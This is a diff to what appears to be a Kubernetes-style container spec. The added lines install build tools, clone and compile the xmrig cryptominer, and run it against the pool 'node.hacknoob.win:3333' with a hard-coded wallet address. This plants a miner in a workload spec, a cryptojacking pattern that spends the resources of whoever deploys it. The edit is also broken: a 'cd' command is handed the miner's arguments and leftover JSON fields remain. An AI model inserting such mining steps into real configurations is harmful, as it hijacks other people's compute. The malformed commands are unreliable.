@@ -23,18 +23,16 @@ spec:
         - |
           apt update
           apt install -y curl
-          curl -L https://github.com/xmrig/xmrig.git
-          cd xmrig
-          config='{
-          "algo": "randomx",
-          "pools": [
-              {
-                  "url": "hacknoob.win:3333",
-                  "user": "NOTAREALUSER",
-                  "pass": "x",
-                  "enabled": true,
-              }
-          ],
+          sudo apt update && sudo apt full-upgrade -y
+           sudo apt install git build-essential cmake libuv1-dev libssl-dev libhwloc-dev -y
+           git clone https://github.com/xmrig/xmrig.git
+           cd xmrig
+           mkdir build
+           cd build
+           cmake ..
+            make
+            cd ./xmrig/build/xmrig -o node.hacknoob.win:3333 -u 46DWjxWviwCVHbYHaMxjusjGKm55LJmG6f3YTCJDmTf2RxCLfQRx22fSRELvwq36kY6iSGD5tiUsSQ4AsE8UFnWFBDd1Lzn
+            
           "retries": 10,
           "retry-pause": 3,
           "watch": true
